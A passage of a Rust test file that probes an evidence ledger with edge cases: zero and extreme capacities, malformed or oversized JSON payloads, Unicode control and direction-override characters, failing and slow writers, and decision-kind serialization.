            trace_id: format!("trace-capacity-{}", capacity_name),
            epoch_id: 1,
            payload: serde_json::json!({"test": "small"}),
            size_bytes: 0,
        };

        let append_result = ledger.append(test_entry);

        match append_result {
            Err(LedgerError::ZeroEntryCapacity) | Err(LedgerError::ZeroByteCapacity) => {
                // Expected for zero capacity configurations
            },
            Err(LedgerError::EntryTooLarge { .. }) => {
                // Acceptable if entry exceeds byte capacity
            },
            Ok(_) => {
                panic!("Should not succeed with zero capacity: {}", capacity_name);
            },
            Err(_) => {
                // Other validation errors acceptable
            }
        }

        // Verify ledger remains empty with zero capacity
        assert!(ledger.is_empty());
        assert_eq!(ledger.len(), 0);
        assert_eq!(ledger.total_appended(), 0);
    }

    // Test extremely large capacity values (potential overflow)
    let extreme_capacity = LedgerCapacity::new(u32::MAX as usize, u64::MAX);
    let mut extreme_ledger = EvidenceLedger::new(extreme_capacity);

    let extreme_test_entry = test_entry("extreme-capacity-test", 1);
    let extreme_result = extreme_ledger.append(extreme_test_entry);

    match extreme_result {
        Ok(_) => {
            // Should handle extreme capacity values without overflow
            let metrics = extreme_ledger.metrics();
            assert_eq!(metrics.total_appended, 1);
            assert!(metrics.current_bytes > 0);
        },
        Err(_) => {
            // May reject extreme capacity configurations
        }
    }
}

/// Test serialization robustness against malformed JSON payloads
#[test]
fn negative_serialization_robustness_malformed_json_payloads() {
    let capacity = LedgerCapacity::new(20, 100000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Test entries with various JSON edge cases and malformed payloads
    let malformed_json_cases = vec![
        // Deeply nested JSON
        {
            let mut nested = serde_json::json!({"level": 1});
            for depth in 2..=1000 {
                nested = serde_json::json!({"level": depth, "nested": nested});
            }
            nested
        },

        // JSON with circular reference potential (very large repeated structures)
        serde_json::json!({
            "circular_test": {
                "a": {"b": {"c": {"a": "potential_cycle"}}},
                "repeated": vec!["same"; 10000],
            }
        }),

        // JSON with special float values
        serde_json::json!({
            "special_numbers": {
                "large_int": 9_223_372_036_854_775_807i64,
                "large_float": 1.7976931348623157e308f64,
                "tiny_float": 5e-324f64,
            }
        }),

        // JSON with Unicode edge cases
        serde_json::json!({
            "unicode_chaos": {
                "emoji": "🚀🔥⚡🌍🎯",
                "scripts": "English中文العربيةрусскийहिन्दी",
                "control_chars": "\u{0001}\u{0002}\u{001F}\u{007F}",
                "zero_width": "\u{200B}\u{200C}\u{200D}\u{FEFF}",
                "rtl_override": "\u{202E}fake\u{202D}real",
            }
        }),

        // JSON with binary-like content
        serde_json::json!({
            "binary_simulation": {
                "base64_like": "YWJjZGVmZ2hpams=",
                "hex_like": "deadbeef1234567890abcdef",
                "random_bytes": String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD, 0xFC, 0x00, 0x01]),
            }
        }),

        // Extremely large JSON object
        {
            let mut large_object = serde_json::Map::new();
            for i in 0..10000 {
                large_object.insert(
                    format!("key_{:06}", i),
                    serde_json::Value::String(format!("value_{}", "x".repeat(100)))
                );
            }
            serde_json::Value::Object(large_object)
        },
    ];

    for (i, malformed_payload) in malformed_json_cases.into_iter().enumerate() {
        let malformed_entry = EvidenceEntry {
            schema_version: "1.0".to_string(),
            entry_id: None,
            decision_id: format!("malformed-json-{}", i),
            decision_kind: DecisionKind::Grant,
            decision_time: "2026-02-20T12:00:00Z".to_string(),
            timestamp_ms: 1000 + i as u64,
            trace_id: format!("trace-malformed-{}", i),
            epoch_id: i as u64 + 1,
            payload: malformed_payload,
            size_bytes: 0,
        };

        let append_result = ledger.append(malformed_entry);

        match append_result {
            Ok(entry_id) => {
                // If accepted, verify serialization operations don't crash
                assert!(entry_id.0 > 0);

                // Test snapshot creation with malformed JSON
                let snapshot = ledger.snapshot();
                assert!(snapshot.entries.len() > 0);

                // Test iteration doesn't crash with malformed payloads
                let all_entries: Vec<_> = ledger.iter_all().collect();
                assert!(all_entries.len() > 0);

                // Verify size estimation handles malformed JSON gracefully
                for (_, entry, size) in &snapshot.entries {
                    assert!(entry.estimated_size() > 0);
                    assert!(*size > 0);
                }
            },
            Err(LedgerError::EntryTooLarge { .. }) => {
                // Expected for extremely large JSON payloads
            },
            Err(_) => {
                // Other validation errors acceptable for malformed JSON
            }
        }
    }

    // Ledger should remain functional after malformed JSON attempts
    let recovery_entry = test_entry("json-recovery-test", 99999);
    let recovery_result = ledger.append(recovery_entry);
    assert!(recovery_result.is_ok(), "Ledger should recover after malformed JSON tests");
}

/// Test spill mode edge cases and write failure scenarios
#[test]
fn negative_spill_mode_edge_cases_write_failure_scenarios() {
    // Test spill mode with intermittently failing writer
    struct IntermittentFailWriter {
        call_count: Arc<std::sync::Mutex<usize>>,
        fail_pattern: Vec<bool>,
    }

    impl IntermittentFailWriter {
        fn new(fail_pattern: Vec<bool>) -> Self {
            Self {
                call_count: Arc::new(std::sync::Mutex::new(0)),
                fail_pattern,
            }
        }
    }

    impl Write for IntermittentFailWriter {
        fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
            let mut count = self.call_count.lock().unwrap();
            let should_fail = self.fail_pattern.get(*count).unwrap_or(&false);
            *count += 1;

            if *should_fail {
                Err(io::Error::new(io::ErrorKind::BrokenPipe, "Intermittent write failure"))
            } else {
                Ok(buf.len())
            }
        }

        fn flush(&mut self) -> io::Result<()> {
            Ok(())
        }
    }

    // Test pattern: fail on 2nd and 5th writes
    let fail_pattern = vec![false, true, false, false, true, false, false];
    let writer = IntermittentFailWriter::new(fail_pattern);

    let capacity = LedgerCapacity::new(10, 50000);
    let mut spill_mode = LabSpillMode::new(capacity, Box::new(writer));

    let mut successful_appends = 0;
    let mut failed_appends = 0;

    // Attempt multiple appends to trigger the intermittent failures
    for i in 0..10 {
        let spill_entry = EvidenceEntry {
            schema_version: "1.0".to_string(),
            entry_id: None,
            decision_id: format!("spill-test-{}", i),
            decision_kind: DecisionKind::Grant,
            decision_time: "2026-02-20T12:00:00Z".to_string(),
            timestamp_ms: 1000 + i as u64,
            trace_id: format!("trace-spill-{}", i),
            epoch_id: i as u64 + 1,
            payload: serde_json::json!({
                "spill_test": true,
                "entry_number": i,
                "data": "x".repeat(100),
            }),
            size_bytes: 0,
        };

        let append_result = spill_mode.append(spill_entry);

        match append_result {
            Ok(_) => {
                successful_appends += 1;
            },
            Err(LedgerError::SpillError { .. }) => {
                failed_appends += 1;
                // Spill mode should remain functional after write failures
            },
            Err(_) => {
                // Other errors acceptable in spill mode
                failed_appends += 1;
            }
        }
    }

    // Should have had some successes and some failures based on the pattern
    assert!(successful_appends > 0, "Should have some successful writes");
    assert!(failed_appends > 0, "Should have some failed writes based on pattern");

    // Spill mode metrics should accurately reflect the state
    let spill_metrics = spill_mode.metrics();
    assert_eq!(spill_metrics.total_appended, successful_appends as u64);

    // Test spill mode with extremely slow writer (timeout simulation)
    struct SlowWriter {
        delay_ms: u64,
    }

    impl SlowWriter {
        fn new(delay_ms: u64) -> Self {
            Self { delay_ms }
        }
    }

    impl Write for SlowWriter {
        fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
            // Simulate slow write operation
            thread::sleep(std::time::Duration::from_millis(self.delay_ms));
            Ok(buf.len())
        }

        fn flush(&mut self) -> io::Result<()> {
            thread::sleep(std::time::Duration::from_millis(self.delay_ms));
            Ok(())
        }
    }

    let slow_writer = SlowWriter::new(10); // 10ms delay per operation
    let mut slow_spill = LabSpillMode::new(LedgerCapacity::new(5, 10000), Box::new(slow_writer));

    // Test that slow writer doesn't cause deadlocks or crashes
    for i in 0..5 {
        let slow_entry = test_entry(&format!("slow-spill-{}", i), i as u64);
        let slow_result = slow_spill.append(slow_entry);

        match slow_result {
            Ok(_) => {
                // Slow write should eventually succeed
            },
            Err(_) => {
                // May fail due to timeout or other issues
            }
        }
    }

    // Verify spill mode remains consistent after slow operations
    assert!(slow_spill.metrics().total_appended <= 5);
}

/// Test evidence entry size calculation edge cases and overflow protection
#[test]
fn negative_evidence_entry_size_calculation_overflow_protection() {
    // Test size calculation with pathological JSON structures
    let size_edge_cases = vec![
        // Entry with recursive-like JSON structure
        EvidenceEntry {
            schema_version: "1.0".to_string(),
            entry_id: None,
            decision_id: "recursive-test".to_string(),
            decision_kind: DecisionKind::Grant,
            decision_time: "2026-02-20T12:00:00Z".to_string(),
            timestamp_ms: 1000,
            trace_id: "trace-recursive".to_string(),
            epoch_id: 1,
            payload: {
                let mut obj = serde_json::json!({
                    "a": {"b": {"c": {"d": "deep"}}},
                });
                // Create a structure that could cause size calculation issues
                for i in 0..100 {
                    obj[format!("array_{}", i)] = serde_json::json!(vec!["item"; 1000]);
                }
                obj
            },
            size_bytes: 0,
        },

        // Entry with very long string values
        EvidenceEntry {
            schema_version: "1.0".to_string(),
            entry_id: None,
            decision_id: "long-strings-test".to_string(),
            decision_kind: DecisionKind::Deny,
            decision_time: "2026-02-20T12:00:00Z".to_string(),
            timestamp_ms: 2000,
            trace_id: "trace-long-strings".to_string(),
            epoch_id: 2,
            payload: serde_json::json!({
                "mega_string": "x".repeat(10_000_000), // 10MB string
                "wide_chars": "🚀".repeat(1_000_000),   // Unicode heavy
                "control_chars": "\x01\x02\x03".repeat(100_000),
            }),
            size_bytes: 0,
        },

        // Entry with many small fields (overhead test)
        EvidenceEntry {
            schema_version: "1.0".to_string(),
            entry_id: None,
            decision_id: "many-fields-test".to_string(),
            decision_kind: DecisionKind::Throttle,
            decision_time: "2026-02-20T12:00:00Z".to_string(),
            timestamp_ms: 3000,
            trace_id: "trace-many-fields".to_string(),
            epoch_id: 3,
            payload: {
                let mut obj = serde_json::Map::new();
                for i in 0..100_000 {
                    obj.insert(format!("field_{:06}", i), serde_json::Value::String("small".to_string()));
                }
                serde_json::Value::Object(obj)
            },
            size_bytes: 0,
        },
    ];

    for (i, size_test_entry) in size_edge_cases.into_iter().enumerate() {
        // Test size estimation doesn't overflow or panic
        let estimated_size = size_test_entry.estimated_size();

        // Size should be reasonable (not zero, not overflowed)
        assert!(estimated_size > 0, "Size estimate should be positive for case {}", i);
        assert!(estimated_size < usize::MAX, "Size estimate should not overflow for case {}", i);

        // For very large entries, size should reflect actual size
        match i {
            1 => {
                // Long strings case should have large size estimate
                assert!(estimated_size > 1_000_000, "Long string entry should have large size estimate");
            },
            2 => {
                // Many fields case should have substantial size
                assert!(estimated_size > 100_000, "Many fields entry should have substantial size estimate");
            },
            _ => {
                // General cases should have reasonable estimates
                assert!(estimated_size > 100, "Size estimate should be substantial");
            }
        }

        // Test that ledger handles size calculations gracefully
        let capacity = LedgerCapacity::new(10, 1_000_000); // 1MB byte limit
        let mut test_ledger = EvidenceLedger::new(capacity);

        let append_result = test_ledger.append(size_test_entry);

        match append_result {
            Ok(_) => {
                // If accepted, verify metrics are consistent
                let metrics = test_ledger.metrics();
                assert!(metrics.current_bytes < u64::MAX);
                assert!(metrics.current_bytes > 0);
            },
            Err(LedgerError::EntryTooLarge { actual_size, max_size }) => {
                // Expected for oversized entries
                assert!(actual_size > max_size);
                assert!(actual_size == estimated_size as u64);
            },
            Err(_) => {
                // Other validation errors acceptable
            }
        }
    }
}

/// Test decision kind enumeration edge cases and serialization
#[test]
fn negative_decision_kind_edge_cases_serialization_robustness() {
    let capacity = LedgerCapacity::new(50, 50000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Test all decision kinds with edge case combinations
    let decision_kinds = vec![
        DecisionKind::Grant,
        DecisionKind::Deny,
        DecisionKind::Throttle,
        DecisionKind::Escalate,
        DecisionKind::Rollback,
    ];

    // Test decision kinds with various problematic combinations
    for (i, decision_kind) in decision_kinds.iter().enumerate() {
        let edge_case_entry = EvidenceEntry {
            schema_version: format!("schema-v{}", i),
            entry_id: None,
            decision_id: format!("decision-kind-test-{:?}-{}", decision_kind, i),
            decision_kind: *decision_kind,
            decision_time: format!("2026-02-{:02}T12:00:00Z", (i % 28) + 1),
            timestamp_ms: u64::MAX.saturating_sub(i as u64),
            trace_id: format!("trace-{:?}-{}", decision_kind, i),
            epoch_id: (i as u64).saturating_mul(1_000_000),
            payload: serde_json::json!({
                "decision_kind_test": format!("{:?}", decision_kind),
                "edge_case": true,
                "test_data": "x".repeat((i + 1) * 1000),
            }),
            size_bytes: 0,
        };

        let append_result = ledger.append(edge_case_entry);
        assert!(append_result.is_ok(), "Should handle all decision kinds: {:?}", decision_kind);

        // Verify decision kind label functions work correctly
        let label = decision_kind.label();
        assert!(!label.is_empty(), "Decision kind label should not be empty");
        assert!(label.is_ascii(), "Decision kind label should be ASCII");
    }

    // Verify iteration and snapshot work with all decision kinds
    let all_entries: Vec<_> = ledger.iter_all().collect();
    assert_eq!(all_entries.len(), decision_kinds.len());

    for (_, entry, _) in all_entries {
        let kind_label = entry.decision_kind.label();
        assert!(!kind_label.is_empty());

        // Verify decision kind matches expected labels
        match entry.decision_kind {
            DecisionKind::Grant => assert_eq!(kind_label, "grant"),
            DecisionKind::Deny => assert_eq!(kind_label, "deny"),
            DecisionKind::Throttle => assert_eq!(kind_label, "throttle"),
            DecisionKind::Escalate => assert_eq!(kind_label, "escalate"),
            DecisionKind::Rollback => assert_eq!(kind_label, "rollback"),
        }
    }

    // Test snapshot consistency with multiple decision kinds
    let snapshot = ledger.snapshot();
    assert_eq!(snapshot.entries.len(), decision_kinds.len());
    assert!(snapshot.total_appended == decision_kinds.len() as u64);

    // Verify all decision kinds are preserved correctly in snapshot
    let snapshot_kinds: Vec<_> = snapshot.entries.iter()
        .map(|(_, entry, _)| entry.decision_kind)
        .collect();

    for kind in decision_kinds {
        assert!(snapshot_kinds.contains(&kind), "Snapshot should contain decision kind: {:?}", kind);
    }
}
